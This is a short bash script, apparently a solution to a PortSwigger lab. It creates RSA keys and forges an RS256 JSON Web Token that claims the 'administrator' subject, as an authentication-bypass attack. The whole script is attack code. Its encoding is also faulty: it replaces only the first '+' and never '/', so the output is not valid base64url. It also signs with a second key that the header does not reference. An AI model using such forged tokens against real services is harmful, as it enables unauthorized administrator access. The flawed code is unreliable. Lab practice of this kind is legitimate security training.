#!/bin/bash -x

openssl genpkey -algorithm RSA -out jwt_private_key.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in jwt_private_key.pem -out jwt_public_key.pem




header='{"alg": "RS256","kid": "test"}'
body='{"iss" : "portswigger","exp" : "1714841211", "sub" : "administrator"}'

#generate key

openssl genrsa -out ./jwt_key.pem 2048

#encode header

header_encoded=$(echo -n $header | base64 | sed s/\+/-/ | sed -E s/=+$//)
body_encoded=$(echo -n $body | base64 | sed s/\+/-/ | sed -E s/=+$//)

jwt_token=$header_encoded.$body_encoded

signature=$(echo -n $jwt_token | openssl dgst -sha256 -binary -sign jwt_key.pem  | openssl enc -base64 | tr -d '\n=' | tr -- '+/' '-_')

echo $jwt_token.$signature